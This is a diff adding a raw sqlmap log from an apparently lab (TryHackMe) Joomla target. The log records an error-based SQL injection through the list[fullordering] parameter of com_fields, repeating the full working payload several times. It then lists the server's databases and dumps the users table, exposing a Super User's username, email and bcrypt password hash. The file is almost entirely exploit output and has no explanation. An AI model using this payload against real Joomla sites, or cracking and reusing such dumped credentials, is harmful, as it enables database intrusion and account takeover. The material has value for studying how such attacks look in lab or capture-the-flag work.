@@ -1,0 +1,70 @@
+sqlmap identified the following injection point(s) with a total of 2722 HTTP(s) requests:
+---
+Parameter: list[fullordering] (GET)
+    Type: error-based
+    Title: MySQL >= 5.0 error-based - Parameter replace (FLOOR)
+    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 1816 FROM(SELECT COUNT(*),CONCAT(0x716a6a6b71,(SELECT (ELT(1816=1816,1))),0x71627a7671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+---
+web server operating system: Linux CentOS 7
+web application technology: PHP 5.6.40, Apache 2.4.6
+back-end DBMS: MySQL >= 5.0 (MariaDB fork)
+available databases [5]:
+[*] information_schema
+[*] joomla
+[*] mysql
+[*] performance_schema
+[*] test
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: list[fullordering] (GET)
+    Type: error-based
+    Title: MySQL >= 5.0 error-based - Parameter replace (FLOOR)
+    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 1816 FROM(SELECT COUNT(*),CONCAT(0x716a6a6b71,(SELECT (ELT(1816=1816,1))),0x71627a7671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+---
+web server operating system: Linux CentOS 7
+web application technology: PHP 5.6.40, Apache 2.4.6
+back-end DBMS: MySQL >= 5.0 (MariaDB fork)
+available databases [5]:
+[*] information_schema
+[*] joomla
+[*] mysql
+[*] performance_schema
+[*] test
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: list[fullordering] (GET)
+    Type: error-based
+    Title: MySQL >= 5.0 error-based - Parameter replace (FLOOR)
+    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 1816 FROM(SELECT COUNT(*),CONCAT(0x716a6a6b71,(SELECT (ELT(1816=1816,1))),0x71627a7671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+---
+web server operating system: Linux CentOS 7
+web application technology: PHP 5.6.40, Apache 2.4.6
+back-end DBMS: MySQL >= 5.0 (MariaDB fork)
+available databases [5]:
+[*] information_schema
+[*] joomla
+[*] mysql
+[*] performance_schema
+[*] test
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: list[fullordering] (GET)
+    Type: error-based
+    Title: MySQL >= 5.0 error-based - Parameter replace (FLOOR)
+    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 1816 FROM(SELECT COUNT(*),CONCAT(0x716a6a6b71,(SELECT (ELT(1816=1816,1))),0x71627a7671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+---
+web server operating system: Linux CentOS 7
+web application technology: Apache 2.4.6, PHP 5.6.40
+back-end DBMS: MySQL >= 5.0 (MariaDB fork)
+Database: joomla
+Table: #__users
+[1 entry]
++-----+------------+----------+---------------------+--------------------------------------------------------------+----------+-------+-----------+---------------------+---------------------+------------+---------+
+| id  | name       | username | email               | password                                                     | usertype | block | sendEmail | registerDate        | lastvisitDate       | activation | params  |
++-----+------------+----------+---------------------+--------------------------------------------------------------+----------+-------+-----------+---------------------+---------------------+------------+---------+
+| 811 | Super User | jonah    | jonah@tryhackme.com | $2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm |          | 0     | 1         | 2019-12-14 20:43:49 | 2019-12-15 23:58:06 | 0          | <blank> |
++-----+------------+----------+---------------------+--------------------------------------------------------------+----------+-------+-----------+---------------------+---------------------+------------+---------+
+
